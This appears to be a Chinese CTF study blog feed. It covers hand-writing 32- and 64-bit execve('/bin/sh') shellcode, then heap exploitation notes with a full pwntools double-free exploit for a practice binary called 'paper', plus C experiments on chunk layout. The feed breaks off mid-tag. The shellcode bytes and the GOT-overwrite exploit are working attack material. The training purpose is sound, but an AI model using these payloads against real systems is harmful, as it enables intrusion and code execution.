    <content type="html"><![CDATA[<p>2022/8/4</p><p>​        不得不说，经过DataCon前两天的培训，感觉我又行了/╲/( •̀ ω •́ )/\╱\</p><h1 id="32位shellcode编写"><a href="#32位shellcode编写" class="headerlink" title="32位shellcode编写"></a>32位shellcode编写</h1><p>参考链接（32位）：<a href="https://blog.csdn.net/helloworlddm/article/details/106594677">shellcode编写32位(Linux)_helloworddm的博客-CSDN博客_linux shellcode</a></p><p>汇编器安装：<a href="https://xiaoxiaoxy1.github.io/2022/07/01/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/#%E5%9F%BA%E4%BA%8EIntel%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E6%B1%87%E7%BC%96%E6%AD%A5%E9%AA%A4">汇编笔记 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位shellcode编写</span></span><br><span class="line">1、手写C代码</span><br><span class="line">   详见参考链接（32位）</span><br><span class="line">   </span><br><span class="line">2、静态编译，防止调用动态链接，在程序中保留系统调用代码</span><br><span class="line">   $ gcc -static -o &lt;可执行文件名&gt; &lt;文件名&gt;.c -32</span><br><span class="line">   </span><br><span class="line">3、gdb &lt;可执行文件名&gt; 查看汇编代码</span><br><span class="line"></span><br><span class="line">4、汇编代码写至&lt;文件名&gt;.asm文件。下面是execve(<span class="string">&quot;/bin/sh&quot;</span>,buf,0);的大致汇编</span><br><span class="line">   global _start</span><br><span class="line">   _start:</span><br><span class="line">   xor ecx,ecx</span><br><span class="line">   xor edx,edx</span><br><span class="line">   push edx</span><br><span class="line">   push <span class="string">&quot;//sh&quot;</span></span><br><span class="line">   push <span class="string">&quot;/bin&quot;</span></span><br><span class="line">   mov ebx,esp</span><br><span class="line">   xor eax,eax</span><br><span class="line">   mov al,0Bh</span><br><span class="line">   int 80h</span><br><span class="line">   </span><br><span class="line">5、nasm编译.asm文件</span><br><span class="line">  $ nasm -f elf32 -o hello.o &lt;文件名&gt;.asm</span><br><span class="line">  $ ld -m elf_i386   -o hello hello.o</span><br><span class="line">  $ objdump -d hello</span><br><span class="line">注：汇编器的安装详见汇编器安装链接，上方↑</span><br><span class="line">  </span><br><span class="line">6、排列好shellcode，排列方式如后图图1</span><br><span class="line">   个人在ubuntu20.04排列的一条32位shellcode：</span><br><span class="line">   <span class="string">&quot;\x31\xC9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68&quot;</span> + </span><br><span class="line">   <span class="string">&quot;\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">组合如下：</span><br><span class="line"><span class="string">&quot;\x31\xC9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">7、写好用作测试的C文件</span><br><span class="line">void <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">    char shellcode[] = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span>;</span><br><span class="line">    void (*fp)(void);</span><br><span class="line">    fp = (void*)shellcode;</span><br><span class="line">    fp();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">8、编译执行C文件</span><br><span class="line">   $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode -m32</span><br><span class="line">   $ ./shellcode</span><br><span class="line">其中 -z execstack 指开启可执行栈</span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu20.04亲测能成，详见图2</span></span><br><span class="line"><span class="comment"># 注：shellcode中不能存在\x00，否则会被判定为NULL，而数组用NULL作为终止符</span></span><br></pre></td></tr></table></figure><p><strong>图1：</strong></p><p><img src="image-20220804204507685.png" alt="image-20220804204507685"></p><p><strong>图2：</strong></p><p><img src="image-20220804210252764.png" alt="image-20220804210252764"></p><h1 id="pwntools默认生成shellcode"><a href="#pwntools默认生成shellcode" class="headerlink" title="pwntools默认生成shellcode"></a>pwntools默认生成shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认生成 如图3</span></span><br><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p><strong>图3：</strong></p><p><img src="image-20220804230850082.png" alt="image-20220804230850082"></p><h1 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h1><p>参考链接（64位）：<a href="https://nuoye-blog.github.io/2020/05/09/dea90f48/">64位shellcode编写 | nuoye’s blog (nuoye-blog.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位shellcode编写</span></span><br><span class="line"><span class="number">1</span>、编写</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注：详细&amp;拓展请看参考链接（64位）</span></span><br><span class="line"><span class="comment"># 注：当然，利用参考链接（32位）的方法也可以写64位shellcod，只不过有些参数得修改一下，这里就不做列出（因为我自己也懒的搞 (๑´∀`๑) ）</span></span><br></pre></td></tr></table></figure><p><strong>图4：</strong></p><p><img src="image-20220804232211941.png" alt="image-20220804232211941"></p>]]></content>
    
    
    <summary type="html">32&amp;64</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>堆</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/07/17/%E5%A0%86/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/07/17/%E5%A0%86/</id>
    <published>2022-07-17T12:40:03.000Z</published>
    <updated>2022-08-05T03:07:10.809Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#some of magic what is I think</span></span><br><span class="line">$ <span class="built_in">ulimit</span> -a    <span class="comment">#源自：https://blog.csdn.net/FHNCSDN/article/details/118458721</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常用的调试指令 （写于2022/07/17）</span></span><br><span class="line">pwndbg&gt; top_chunk             <span class="comment">#打印top chunk初始地址</span></span><br><span class="line">pwndbg&gt; vmmap                 <span class="comment">#查看vmmap表</span></span><br><span class="line">pwndbg&gt; bin                   <span class="comment">#查看bin表</span></span><br><span class="line">pwndbg&gt; heap                  <span class="comment">#查看堆</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; file ./&lt;二进制文件名&gt;  <span class="comment">#导入源代码，方便调试</span></span><br><span class="line">pwndbg&gt; x/150gx 0x&lt;地址&gt;      <span class="comment">#打印堆信息  x/150gx 0x555555559000</span></span><br><span class="line"></span><br><span class="line">      $ gdb &lt;二进制文件&gt;</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> environment LD_PRELOAD ./&lt;libc文件&gt;   <span class="comment"># set environment LD_PRELOAD ./libc-2.23.so</span></span><br><span class="line">pwndbg&gt; starti</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#命令行指令</span></span><br><span class="line">$ gdb --args env LD_PRELOAD=./x64/2.23/libc-2.23.so ./x64/2.23/ld-2.23.so ./note</span><br><span class="line"><span class="comment"># gdb --args env LD_PRELOAD=./x64/2.23/libc-2.23.so ./x64/2.23/ld-2.23.so ./hacknote</span></span><br><span class="line"></span><br><span class="line">$ LD_PRELOAD=./my.so ./my_program        <span class="comment">#https://zgserver.com/ld_preloadgdb.html</span></span><br><span class="line">$ gdb your_program (gdb) <span class="built_in">set</span> environment LD_PRELOAD=./yourso.so (gdb) start</span><br><span class="line">$ LD_PRELOAD=./my.so gdb ./my.program </span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="好的学习文章"><a href="#好的学习文章" class="headerlink" title="好的学习文章"></a>好的学习文章</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://introspelliam.github.io/2017/09/10/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8A/">Linux堆内存管理深入分析上 | Introspelliam</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://introspelliam.github.io/2017/09/15/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8B/">Linux堆内存管理深入分析下 | Introspelliam</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.cnblogs.com/unr4v31/p/14446412.html">Glibc堆管理机制基础 - unr4v31 - 博客园 (cnblogs.com)</a></p><p><a href="http://brieflyx.me/2015/python-module/pwntools-intro/">Exploit利器——Pwntools - BrieflyX’s Base</a></p><p><a href="https://blog.csdn.net/weixin_45556441/article/details/115721445">关于addr=u32(r.recvuntil(‘\xf7‘)-4:])的解释_半岛铁盒@的博客-CSDN博客_recvuntil函数</a></p><p><a href="https://www.cnblogs.com/chrysanthemum/p/11772977.html">攻防世界 | string - laolao - 博客园 (cnblogs.com)</a></p><h2 id="堆（2022-07-17）"><a href="#堆（2022-07-17）" class="headerlink" title="堆（2022/07/17）"></a>堆（2022/07/17）</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、关于栈、堆、堆栈这三个东西，普遍认为堆栈只是栈的不同叫法，但有些地方会混淆堆栈的说法把堆说成堆栈，具体指什么还得自己在所处语境去自行分辨。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、对于 “ 物理相邻的前一个chunk ” ，以chunk的prev_size为chunk前部，那么 “物理相邻的前一chunk” 是指相邻的第一个低地址chunk </p><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h3><h4 id="paper-（double-free）"><a href="#paper-（double-free）" class="headerlink" title="paper （double free）"></a>paper （double free）</h4><p><a href="https://xuanxuanblingbling.github.io/assets/pwn/paper">题目链接</a></p><p>[Ubuntu16.04安装教程](<a href="https://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/#Ubuntu-16-04%E5%AE%89%E8%A3%85">ubuntu20.04 &amp; ubuntu16.04安装 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">解题步骤：(实验环境：Ubuntu16.04)</span><br><span class="line">1、找漏洞点</span><br><span class="line">    IDA 反编译 paper 文件  <span class="comment">#存在后门函数</span></span><br><span class="line">    got表可写    <span class="comment">#ida shift+F7查看.got.plt位置，gdb中vmmap查看该段读写权限</span></span><br><span class="line">    存在Double free的情况，可以进行任意地址写</span><br><span class="line">    fastbin Attack 中的 Double free <span class="comment">#本题类型</span></span><br><span class="line">2、利用分析</span><br><span class="line">    利用double free重写got表地址，将后门函数地址覆盖got表中的特定函数</span><br><span class="line">    执行被覆写函数，就会跳到后门函数拿到shell</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the index you want to store(0-9):&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;How long you will enter:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please enter your content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index(0-9):&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)  #调试时去注释</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x60202a</span>   <span class="comment">#构造出的chunk的chunk头起始地址</span></span><br><span class="line">addr1= <span class="number">0x400943</span>   <span class="comment">#后门函数地址</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,size,<span class="string">&quot;1313&quot;</span>)  </span><br><span class="line">add(<span class="number">1</span>,size,<span class="string">&quot;1545&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)         <span class="comment">#两次申请chunk，三次freechunk，做到Doublefree</span></span><br><span class="line">add(<span class="number">2</span>,size,p64(addr))  <span class="comment">#fd指针修改为got表上指定地址</span></span><br><span class="line">add(<span class="number">3</span>,size,<span class="string">&quot;1312&quot;</span>)</span><br><span class="line">add(<span class="number">4</span>,size,<span class="string">&quot;1543&quot;</span>)</span><br><span class="line"><span class="comment">#padding = b&quot;\xa7\xf7\xff\x7f\x00\x00&quot;+p64(addr1)</span></span><br><span class="line">padding = <span class="string">b&quot;\x40\x00\x00\x00\x00\x00&quot;</span>+p64(addr1)</span><br><span class="line">add(<span class="number">5</span>,size,padding)    <span class="comment">#got表上伪造chunk，覆写正常函数为后门函数</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;2 delete paper&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  <span class="comment">#调用被覆写函数，执行后门函数</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p><img src="image-20220728162036516.png" alt="image-20220728162036516"></p><p>构造的chunk大小服从于最终地址处适用的chunk大小，能否不服从于最终地址处适用chunk大小来构造chunk</p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 **(首先要通过验证)**，这就相当于任意地址写任意值的效果。</p><p>Arena：<a href="https://blog.csdn.net/qq_41453285/article/details/96846067">什么是堆漏洞挖掘？堆的glibc实现、Arena（main_arena、thread_arena）_董哥的黑板报的博客-CSDN博客</a></p><p>fastbin attack：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#fastbin-attack">Fastbin Attack - CTF Wiki (ctf-wiki.org)</a></p><p>参考链接：<a href="https://blingblingxuanxuan.github.io/2020/02/23/paper/">ctf堆入门 - paper | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><br/><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>链接：<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html</a></p><br/><br/><h2 id="一些关于堆上数据的研究-（2022-07-17）"><a href="#一些关于堆上数据的研究-（2022-07-17）" class="headerlink" title="一些关于堆上数据的研究 （2022/07/17）"></a>一些关于堆上数据的研究 （2022/07/17）</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>注：忘了堆上的数据怎么存的、指针怎么指的的话就回头看两眼</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来的操作都是在Ubuntu20.04版本下调试出来的</p><br/><h3 id="one（堆上的数据怎么存的？）（2022-07-18）"><a href="#one（堆上的数据怎么存的？）（2022-07-18）" class="headerlink" title="one（堆上的数据怎么存的？）（2022/07/18）"></a>one（堆上的数据怎么存的？）（2022/07/18）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">//源C代码  cs1d.c</span><br><span class="line">//编译指令：gcc -g cs1d.c -o cs1d  代码是修改别人的代码得来的</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *hollk, *hollk1;</span><br><span class="line">    hollk = malloc(0x10);                             //-2 分配第一个0x10的chunk</span><br><span class="line">    malloc(0x10);                                     //-1 分配第二个0x10的chunk   </span><br><span class="line">    *(long long *)((long long)hollk - 0x8) = 0x41;    //0  修改第一个块的size域</span><br><span class="line">    </span><br><span class="line">    *(long long *)((long long)hollk - 0x1) = 0x12;    //1  对应下图中的 1</span><br><span class="line">    *(long long *)((long long)hollk - 0x2) = 0x4321;  //2  对应下图中的 2</span><br><span class="line">    *(long long *)((long long)hollk - 0x3) = 0x23;    //3  对应下图中的 3</span><br><span class="line">    *(long long *)((long long)hollk - 0x4) = 0x5432;  //4  对应下图中的 4</span><br><span class="line">    *(long long *)((long long)hollk - 0xa) = 0x34;    //5  对应下图中的 5</span><br><span class="line">    *(long long *)((long long)hollk - 0xb) = 0x6543;  //6  对应下图中的 6</span><br><span class="line">    *(long long *)((long long)hollk - 0xc) = 0x45;    //7  ......</span><br><span class="line">    *(long long *)((long long)hollk - 0xd) = 0x7654;  //8</span><br><span class="line">    *(long long *)((long long)hollk - 0x10) = 0x11;   //9</span><br><span class="line">    *(long long *)((long long)hollk - 0x11) = 0x22;   //10</span><br><span class="line">    *(long long *)((long long)hollk - 0x12) = 0x3333; //11</span><br><span class="line">    *(long long *)((long long)hollk - 0x1a) = 0x44;   //12</span><br><span class="line">    *(long long *)((long long)hollk - 0x1b) = 0x5555; //13</span><br><span class="line">    *(long long *)((long long)hollk - 0x0) = 0x99;    //14</span><br><span class="line">    *(long long *)((long long)hollk + 0x1) = 0x8888;  //15</span><br><span class="line">    *(long long *)((long long)hollk + 0x2) = 0x77;    //16</span><br><span class="line">    *(long long *)((long long)hollk + 0x3) = 0x666;   //17</span><br><span class="line">    *(long long *)((long long)hollk + 0x4) = 0x555555;//18</span><br><span class="line">    *(long long *)((long long)hollk + 0xa) = 0x44;    //19</span><br><span class="line">    *(long long *)((long long)hollk + 0xb) = 0x33;    //20</span><br><span class="line">    *(long long *)((long long)hollk + 0xc) = 0x2222;  //21</span><br><span class="line">    *(long long *)((long long)hollk + 0xd) = 0x111111;//22</span><br><span class="line">    </span><br><span class="line">    //注：0x10 = 16</span><br><span class="line">    </span><br><span class="line">    free(hollk);</span><br><span class="line">    hollk1 = malloc(0x30);// 实现extend，控制了第二个块的内容</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//参考链接：https://blog.csdn.net/qq_41202237/article/details/108320408</span><br><span class="line">//以上链接估计是参考ctf wiki上的堆知识，不过比ctf wiki上的堆讲解看起来好懂很多</span><br></pre></td></tr></table></figure><p><img src="image-20220718144652105.png" alt="image-20220718144652105"></p><p><img src="image-20220718145936405.png" alt="image-20220718145936405"></p><p><strong>小结：经过对指针附近数据的变化可以看出，我们指向chunk的指针是指在User_data这一段起始的地方，而不是chunk头的Prev_size处</strong></p><br/><h3 id="two（申请chunk后堆上的chunk分布是怎么样的？）（2022-07-18）"><a href="#two（申请chunk后堆上的chunk分布是怎么样的？）（2022-07-18）" class="headerlink" title="two（申请chunk后堆上的chunk分布是怎么样的？）（2022/07/18）"></a>two（申请chunk后堆上的chunk分布是怎么样的？）（2022/07/18）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//源C代码  cs1e.c</span><br><span class="line">//gcc -g cs1e.c -o cs1e</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *hollk, *hollk1; //0之前vmmap指令查看不到heap堆</span><br><span class="line">    hollk = malloc(0x10); //0 分配第一个0x10的chunk 此时vmmap可以查看到内存上分出了堆空间</span><br><span class="line">    malloc(0x10);    //1 分配第二个0x10的chunk</span><br><span class="line">    </span><br><span class="line">    malloc(0x20);    //2</span><br><span class="line">    malloc(0x30);    //3</span><br><span class="line">    malloc(0x40);    //4  heap此时大小为0x21000字节</span><br><span class="line">    malloc(0x42000); //5  现在申请0x42000字节看heap增大到多少。 结果：heap并未增长</span><br><span class="line">    </span><br><span class="line">    *(long long *)((long long)hollk - 0x8) = 0x41;// 修改第一个块的size域</span><br><span class="line">    free(hollk);</span><br><span class="line">    hollk1 = malloc(0x30);// 实现extend，控制了第二个块的内容</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220718132324717.png" alt="image-20220718132324717"></p><p><img src="image-20220718151556184.png" alt="image-20220718151556184"></p><p><img src="image-20220718151124041.png" alt="image-20220718151124041"></p><p><img src="image-20220718151809247.png" alt="image-20220718151809247"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看出当malloc申请一个大于当前初始分配的堆空间时没有立马扩大当前的堆区，而是先在Memory Mapping Segment 中调用了一段空间，或许之后利用到这块空间时，堆管理器才会向操作系统申请一块更大的堆空间来完成对这段0x42000字节空间的分配。总之很多细节本人目前也不了解，没研究过源码，也找不到相关的学习资料，只能靠个人的猜测。以下是百度找来的图片，帮助理解</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDI0MDY3,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>小结：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不难发现，top chunk的空间从20d50—&gt;20d30—&gt;20d00—&gt;20cc0—&gt;20c70，说明在bin中无合适（目前没有执行过free，bin表为空）chunk的情况下新的chunk的申请空间直接从top chunk划分出来，并紧挨着top chunk</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发现的小知识：以上代码申请到的堆空间大小为0x7a000-0x59000 = 0x21000 = 135168 B = 132 KB，也就是说默认分配了132KB的内存空间作为堆的空间</p><p><img src="image-20220718135030412.png" alt="image-20220718135030412"></p><p>目前的堆结构可由下图表示(个人的理解)：对了，top chunk也是有chunk头的，图中没表示出来</p><p><img src="image-20220718133927099.png" 